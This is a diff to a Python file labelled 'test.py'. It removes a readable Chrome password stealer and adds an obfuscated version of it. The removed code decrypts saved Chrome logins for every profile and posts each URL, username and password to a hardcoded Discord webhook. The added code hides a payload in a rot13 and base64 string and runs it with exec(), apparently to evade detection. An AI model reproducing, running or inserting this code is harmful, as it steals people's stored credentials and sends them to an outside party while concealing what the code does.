@@ -1,87 +1,13 @@
-import os
-import json
+# Code source encodé de "test.py"
+encoded_source = """
+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"""
+
 import base64
-import sqlite3
-import shutil
-from datetime import datetime, timedelta
-from Crypto.Cipher import AES
-import win32crypt
-import requests
+import codecs
 
-def get_chrome_datetime(chromedate):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-def get_encryption_key():
-    try:
-        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-    except Exception as e:
-        return None
-def decrypt_password_chrome(password, key):
-    try:
-        iv = password[3:15]
-        password = password[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(password)[:-16].decode()
-    except Exception as e:
-        try:
-            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-        except Exception as e:
-            return ""
-def send_discord_webhook(url, profile, url_info, username, password):
-        data = {
-            "embeds": [
-                {
-                    "title": f"Profile: {profile}",
-                    "fields": [
-                        {"name": "URL", "value": url_info},
-                        {"name": "Username", "value": username},
-                        {"name": "Password", "value": password}
-                    ]
-                }
-            ]
-        }
-        response = requests.post('https://discordapp.com/api/webhooks/1102174050383573102/_6WZ3iMFROeHW83TTSMI5cUm6CuSDmanUZdZolbCCMDuAsuLIqJ2_4P3r7clJOVJTIuM', json=data)
-        if response.status_code == 204:
-            print("Webhook sent successfully")
-        else:
-            print(f"Failed to send webhook, status code: {response.status_code}")       
-def main():
-    profiles_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
-    profiles = [d for d in os.listdir(profiles_path) if os.path.isdir(os.path.join(profiles_path, d))]
-    for profile in profiles:
-        db_path = os.path.join(profiles_path, profile, "Login Data")
-        file_name = f"ChromeData_{profile}.db"
-        if not os.path.isfile(db_path):
-            continue
-        shutil.copyfile(db_path, file_name)
-        db = sqlite3.connect(file_name)
-        cursor = db.cursor()
-        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-        result = {}
-        for row in cursor.fetchall():
-            action_url = row[1]
-            username = row[2]
-            password = decrypt_password_chrome(row[3], get_encryption_key())
-            if username or password:
-                result[action_url] = [username, password]
-            else:
-                continue
-        cursor.close()
-        db.close()
-        try:
-            os.remove(file_name)
-        except Exception as e:
-            print(f"E")
-        for url, credentials in result.items():
-            url_info = url if url else action_url
-            send_discord_webhook(url, profile, url_info, credentials[0], credentials[1])
+decoded_source = codecs.decode(encoded_source, "rot13")
+decoded_source = decoded_source.encode("utf-8")
+decoded_source = base64.b64decode(decoded_source)
+decoded_source = decoded_source.decode("utf-8")
 
-
-    
-
-if __name__ == "__main__":
-    main()
+exec(decoded_source)
